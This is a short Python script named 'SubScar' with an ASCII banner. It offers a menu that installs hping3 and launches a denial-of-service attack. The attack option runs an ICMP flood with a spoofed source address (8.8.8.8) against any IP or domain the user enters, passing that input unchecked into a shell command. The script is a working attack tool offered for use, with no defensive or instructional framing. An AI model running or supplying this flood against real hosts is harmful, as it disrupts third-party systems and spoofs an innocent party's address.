import subprocess

print ("""
\033[1;92m ___  ___  ________  ___  ________   ________ ________     
|\  \|\  \|\   __  \|\  \|\   ___  \|\   ____\\\\_____  \    
\ \  \\\\\  \ \  \|\  \ \  \ \  \\\\ \  \ \  \___\|____|\ /_   
 \ \   __  \ \   ____\ \  \ \  \\\\ \  \ \  \  ___   \|\  \  
  \ \  \ \  \ \  \___|\ \  \ \  \\\\ \  \ \  \|\  \ __\_\  \ 
   \ \__\ \__\ \__\    \ \__\ \__\\\\ \__\ \_______\\\\_______\\
    \|__|\|__|\|__|     \|__|\|__| \|__|\|_______\|_______|
\033[1;m                                                                                           
"""
)

mg= ("SubScar")
long= len(mg) + 8
print('#'+ long * '-' + '#')
print('|'+ long*' '+'|')
print('|'+4*' '+mg+4*' '+'|')
print('|'+ long * ' ' + '|')
print('#'+ long * '-' + '#')

while(True):
    print("""
    \033[1;94m
    1- Install hping4
    2- Launch DoS attack with hping4
    3- Exit
    \033[1;m
    """)

    op=input("\033[1;91m> \033[1;m")

    if op=='1':
        subprocess.call('sudo apt-get install hping3 -y', shell=True)

    elif op=='2':
        ip= input('Give me a ip or domain: ')
        ping= ('hping3 --icmp -a \'8.8.8.8\' -e \'fsociety\' --flood ')
        subprocess.call(ping + ip, shell=True)

    elif op=='3':
        break

    else:
        print("\033[1;93mError!\033[1;m")
